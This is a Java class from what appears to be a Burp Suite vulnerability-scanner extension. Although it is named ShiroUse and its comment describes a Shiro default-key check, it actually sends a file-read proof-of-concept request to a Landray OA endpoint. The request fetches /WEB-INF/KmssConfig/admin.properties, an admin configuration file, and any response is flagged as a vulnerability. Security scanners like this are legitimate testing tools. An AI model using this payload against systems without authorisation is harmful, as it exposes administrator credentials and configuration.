package burp.vuls;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.impl.VulResult;
import burp.impl.VulTaskImpl;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.List;

public class ShiroUse extends VulTaskImpl {

    public ShiroUse(IExtensionHelpers helpers, IBurpExtenderCallbacks callbacks, List<BurpExtender.LogEntry> log, IHttpRequestResponse messageInfo) {
        super(helpers, callbacks, log, messageInfo);
    }

    /**
     * 这个只是看下是否使用了shiro，并检测是否使用默认密钥
     */
    @Override
    public VulResult run() {
        // TODO 待完成
        if (method.equalsIgnoreCase("post")) {
            //新的请求包
            url = iHttpService.getProtocol() + "://" + iHttpService.getHost() + ":" + iHttpService.getPort() + "/sys/ui/extend/varkind/custom.jsp";
            String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
            //新请求
            okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new ShiroUseCallback(this));
        }
        return result;
    }
}

class ShiroUseCallback implements Callback {

    VulTaskImpl vulTask;

    public ShiroUseCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
    }
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        vulTask.callbacks.printError("[ShiroUseCallback-onFailure] " + e.getMessage() + "\n" + vulTask.request_info);
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        // TODO 待完成
        if (response.isSuccessful()){
            vulTask.setOkhttpMessage(call, response); //保存okhttp的请求响应信息
            // 检查响应体是否有内容
            if (vulTask.ok_respBody.length() > 0) {
                vulTask.message = "LandrayOa Vul";
                vulTask.log(call);
            }
        }
    }
}